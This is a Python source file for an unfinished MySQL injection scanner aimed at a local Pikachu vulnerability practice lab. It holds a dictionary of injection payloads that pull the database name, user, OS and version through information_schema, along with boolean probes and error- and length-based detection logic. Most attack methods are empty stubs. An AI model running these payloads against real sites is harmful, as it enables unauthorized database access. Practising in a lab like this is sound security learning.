from utils.http_tools import HTTPTools

WITHOUT_VULNERABILITY = 0
INACCESSIBLE = 1
WITH_ECHO = 3
WITHOUT_ECHO = 2

class MysqlAttack:
    def __init__(self,url,http_message = None):
        self.method = HTTPTools.check_request_method(url)
        self.url = url
        self.parse_url,self.query_parameters = HTTPTools.get_argv(url)
        self.argv = list(self.query_parameters.keys())
        self.null_length = None
        self.flag_length = None
        self.http_message = http_message
        # 字典payload，用来爆破当前数据库，当前用户，以及对方操作系统
        self.payloads = {
            "database":"database() from information_schema.schemata #",
            "user":"user() from information_schema.schemata #",
            "os":"@@version_compile_os from information_schema.schemata #",
            "version":"version() from information_schema.schemata #",
            "number":" and 2013 = 2014 #",
            "character":" ' and 2013 = 2014 #"
        }
        self.database = None
        self.user = None
        self.databases = []
        self.tables = []
        self.columns = []
        self.datas = []
        self.ascii_table = [
            0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
            32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63,
            64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79,80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95,
            96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111,112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127,
            128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159,
            160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175,176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191,
            192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207,208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223,
            224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239,240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255
        ]
    def get_available_argv(self):
        print(self.query_parameters)
        self.flag_length = len(HTTPTools.send_get_request(self.url).content)

        url = HTTPTools.update_url_parameters(self.parse_url,self.query_parameters,{'name':"","submit":""})
        self.null_length = len(HTTPTools.send_get_request(url).content)

        url = HTTPTools.update_url(self.parse_url, self.query_parameters, "name", "666666666")

        for arg in self.argv:

            url = HTTPTools.update_url(self.parse_url,self.query_parameters,arg,"666666666")


    def is_sql_attack(self,url):
        if HTTPTools.send_get_request(url=url).status_code != 200:
            print("无法访问")
            return INACCESSIBLE
        else:
            print("可以访问")
            if "SQL syntax" in str(HTTPTools.send_get_request(url=url).content):
                return WITH_ECHO
            else:
                is_echo = abs(len(HTTPTools.send_get_request(url=url).content) - self.null_length)
                if 0<= is_echo <= 5:
                    return WITHOUT_ECHO
            return WITHOUT_VULNERABILITY

    def normal_attack(self):
        pass

    def encode_attack(self):
        pass

    def sleep_attack(self):
        pass

    def boolean_attack(self):
        pass

if __name__ == "__main__":
    url = "http://127.0.0.1/pikachu-master/vul/sqli/sqli_str.php?name=1%27&submit=%E6%9F%A5%E8%AF%A2"
    mysql_attack = MysqlAttack(url=url)
    # # mysql_attack.is_sql_attack()
    print(mysql_attack.is_sql_attack(url))
    mysql_attack.get_available_argv()
    # print(len(HTTPTools.send_get_request(url).content))